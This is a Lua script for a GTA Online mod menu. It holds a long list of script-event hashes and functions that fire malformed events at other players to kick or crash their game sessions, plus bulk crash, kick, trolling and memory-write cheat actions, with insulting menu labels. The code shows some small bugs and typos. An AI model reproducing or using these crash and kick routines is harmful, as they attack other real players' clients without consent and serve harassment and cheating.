-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694,
69874647,
924535804,
1494472464,
-1991317864,
1902624891,
127278285,
-195247709,
-1322571352,
704979198,
-1970125962,
2112408256,
677240627,
-2113023004,
-1704141512,
962740265,
-1386010354,
603406648,
-1715193475,
1258808115,
998716537,
163598572,
-1056683619,
-393294520,
153488394,
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694,
153488394,
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694
}

array_kick = function(pid)
    for i, v in pairs(kicks) do
        arg1 = math.random(-2147483647, 2147483647)
        arg2 = math.random(-1987543, 1987543)
        arg3 = math.random(-19, 19)
        util.trigger_script_event(1 << pid, {v, pid, arg1, arg3, arg2, arg2, arg1, arg1, arg3, arg3, arg1, arg3, arg2, arg3, arg1, arg1, arg2, arg3, arg1, arg2, arg2, arg3, arg3})
        util.yield()
    end
    util.toast("Kicked " .. PLAYER.GET_PLAYER_NAME(pid))
    util.log("Kicked " .. PLAYER.GET_PLAYER_NAME(pid))
end

Addictcrashes = function(pid)
    for i, v in pairs(kicks) do
        arg1 = math.random(-2147483647, 2147483647)
        arg2 = math.random(-1987543, 1987543)
        arg3 = math.random(-19, 19)
        util.trigger_script_event(1 << pid, {v, pid, arg1, arg3, arg2, arg2, arg1, arg1, arg3, arg3, arg1, arg3, arg2, arg3, arg1, arg1, arg2, arg3, arg1, arg2, arg2, arg3, arg3})
        util.yield()
    end
    util.toast("Crashed " .. PLAYER.GET_PLAYER_NAME(pid))
    util.log("Crashed " .. PLAYER.GET_PLAYER_NAME(pid))
end

local resolves = {
	"Hahaha",
	"Bitch!",
    "Whatever Fuck This! :P"
}

drift = false
function drift(toggle)
	if drift then
		while true do
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(1, 61) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
        					VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
        					VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
			util.yield()
		end
	end
end

custselc = menu.list(menu.my_root(), "Select Pussies", {}, "", function(); end)

menu.toggle(custselc, "Exclude Selected", {"excludepussies"}, "If toggled it will select all players apart from selected players.", function(on_toggle)
    if on_toggle then
        excludeselected = true
    else
        excludeselected = false
    end
end)

selectedplayer = {}
for b = 0, 31 do
    selectedplayer[b] = false
end
excludeselected = false

cmd_id = {}
for i = 0, 31 do
	cmd_id[i] = 0
end

local chaos, gravity, speed = false, true, 100

menu.action(custselc, "Go to Players List", {"gotopl"}, "Shotcut for players list.", function()
    menu.trigger_commands("playerlist")
end)

menu.divider(custselc, "Slap Man")


rp_cash_loops = menu.list(custselc, "Cash & RP Loops", {}, "", function(); end)

menu.action(rp_cash_loops, "Give Crazy Loop", {"crazyloopto"}, "Warning! 8 People Max Or Script Will Not Cope.", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                util.yield(2000)
                menu.trigger_commands("crazyloop" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Crazy Rank has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                util.yield(1500)
                menu.trigger_commands("crazyloop" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Crazy Rank has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        end
    end
end)

menu.action(rp_cash_loops, "{Jrukii's} RP Loop", {"rankall"}, "", function()
    --notification("Rank Everyone " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
                menu.trigger_commands("givebigrp" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Rank Everyone has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
                menu.trigger_commands("givebigrp" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Rank Everyone has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        end
    end
end)

menu.action(rp_cash_loops, "Give RP Steadily", {"giverpstedto"}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("giverpsted" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("RP Stead has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("giverpsted" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("RP Stead has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        end
    end
end)

menu.action(rp_cash_loops, "Give RP Loop", {"giverpto"}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("giverp" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("RP Loop has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("giverp" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("RP Loop has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        end
    end
end)

helpful_trolling = menu.list(custselc, "Trolling Or Helpful", {}, "", function(); end)

menu.divider(helpful_trolling, "Trolling")

menu.action(helpful_trolling, "Candy Upgrade Vehicle", {"candyvehs"}, "Sets vehicle modifications to pink with candy canes.", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
                menu.trigger_commands("ugveh" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Candy Upgrade has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
                menu.trigger_commands("ugveh" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Candy Upgrade has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        end
    end
end)

menu.action(helpful_trolling, "Send UFO Attacker", {"sendufo"}, "Sends a ufo to hunt them and kil them.", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
                menu.trigger_commands("sendufo" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Ufo has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
                menu.trigger_commands("ugvsendufoeh" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Ufo has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        end
    end
end)

menu.action(helpful_trolling, "Vehicle Kick", {}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
                menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
                menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        end
    end
end)

menu.action(helpful_trolling, "Give Wanted", {}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("givewanted" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Give Wanted has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("givewanted" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Give Wanted has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        end
    end
end)

menu.divider(helpful_trolling, "Helpful")

menu.action(helpful_trolling, "Give A UFO", {"giveufoto"}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("giveufo" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("UFO has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("giveufo" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("UFO has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        end
    end
end)

menu.action(helpful_trolling, "Infinity Ammo", {"infintyammoto"}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("autoammo" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Ammo has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("autoammo" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Ammo has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        end
    end
end)

menu.action(helpful_trolling, "Send Friend Request", {"sendfriend"}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("historybefriend" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Friend Request has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("historybefriend" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Friend Request has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
            end
        end
    end
end)

tp_players = menu.list(custselc, "Teleports", {}, "", function(); end)

menu.action(tp_players, "TP Players", {"tpplayers"}, "Teleports to you.", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("summon" .. PLAYER.GET_PLAYER_NAME(pids))
                util.toast("Give them a second to get on..." .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Teleporting " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("summon" .. PLAYER.GET_PLAYER_NAME(pids))
                util.toast("Give them a second to get on..." .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Teleporting " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        end
    end
end)

menu.action(tp_players, "TP Players To Casino", {"autocasinoall"}, "It will send your player to the table if selected on you to.", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("autocasino" .. PLAYER.GET_PLAYER_NAME(pids))
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("autocasino" .. PLAYER.GET_PLAYER_NAME(pids))
            end
        end
    end
end)

menu.action(tp_players, "TP Players To Their Waypoint", {"sendtowaypoints"}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("wptp" .. PLAYER.GET_PLAYER_NAME(pids))
                util.toast("Teleporting..." .. PLAYER.GET_PLAYER_NAME(pids))
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("wptp" .. PLAYER.GET_PLAYER_NAME(pids))
                util.toast("Teleporting..." .. PLAYER.GET_PLAYER_NAME(pids))
            end
        end
    end
end)

menu.action(tp_players, "TP Player To MazeBank", {"tpplayersmazebank"}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                util.yield(100)
                menu.trigger_commands("tpmazebank" .. PLAYER.GET_PLAYER_NAME(pids))
                util.toast("Teleporting..." .. PLAYER.GET_PLAYER_NAME(pids))
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                util.yield(100)
                menu.trigger_commands("tpmazebank" .. PLAYER.GET_PLAYER_NAME(pids))
                util.toast("Teleporting..." .. PLAYER.GET_PLAYER_NAME(pids))
            end
        end
    end
end)

crashes_kicks = menu.list(custselc, "Crashes & Kicks", {}, "", function(); end)

menu.action(crashes_kicks, "Next Gen Crash", {}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("ngcrash" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Next Gen Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("ngcrash" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Next Gen Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        end
    end
end)

menu.action(crashes_kicks, "Steamroller Crash", {}, "", function()
    --notification("Sending Steamroller Crash crash to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("steamroll" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Ha Addict Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("steamroll" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Steamroller Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        end
    end
end)

menu.action(crashes_kicks, "Desync Kick", {desynckick}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("desynckick" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Get fucked off " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("desynckick" .. PLAYER.GET_PLAYER_NAME(pids))
                --notification("Get fucked off " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            end
        end
    end
end)

menu.action(crashes_kicks, "Breakup Kick", {"break"}, "Kicks Them.", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("breakup" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("breakup" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        end
    end
end)

menu.action(crashes_kicks, "Blast Kick", {}, "Blocks Joins And Kicks Them.", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("blast" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("blast" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        end
    end
end)

menu.action(crashes_kicks, "Block Player", {}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("historyblock" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("historyblock" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        end
    end
end)

menu.divider(custselc, "GG's")

for pids = 0, 31 do
    if players.exists(pids) then
        cmd_id[pids] = menu.toggle(custselc, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "PID - ".. pids, function(on_toggle)
            if on_toggle then
                selectedplayer[pids] = true
            else
                selectedplayer[pids] = false
            end
        end)
    end
end

protex = menu.list(menu.my_root(), "Net Shit", {"netshit"}, "", function(); end)

local pidsacam = menu.list(protex, "Anti Crash Camera", {}, "")
local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")

menu.action(pidsacam, "[ON/OFF] Anti Crash Camera", {"acamoff"}, "Deactivates ped regen,invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and unblocks all connections", function()
    menu.trigger_commands("anticrashcam")
end)

local anti_bounty = menu.list(protex, "Anti-Bounty's")

menu.action(anti_bounty, "Anti-Bounty", {"bountyoff"}, "Turns off bounty's.", function()
if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then 
 memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
 memory.write_int(memory.script_global((2359296+1) + 5149 + 13), 2880000)
else
    util.toast("You don't currently have a bounty bitch! xD.")
    end
end)

menu.toggle_loop(anti_bounty, "Anti-Bounty's", {"bountysoff"}, "Turns off bounty's. Keep toggled if bounty's persist", function()
if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then 
 memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
 memory.write_int(memory.script_global((2359296+1) + 5149 + 13), 2880000)
else
    end
end)

menu.action(protex, "Tp Casino", {"tpincasino"}, "Faster alternative way of teleporting into the casino.", function(on_toggle)
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
    for i=1,3  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1112.384, 225.92778, -48.758114)
        menu.trigger_commands("levitate")
        util.yield(1000)
        menu.trigger_commands("levitate")
    end
end)

menu.toggle_loop(protex, "Always Unarmed", {"alwaysunarmed"}, "If your player is frozen on unarmed toggle this off and on to fix without suicide.", function(on_loop)
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    WEAPON.GIVE_WEAPON_TO_PED(player_ped, util.joaat('WEAPON_COUGAR'), 1, true, true)
end)

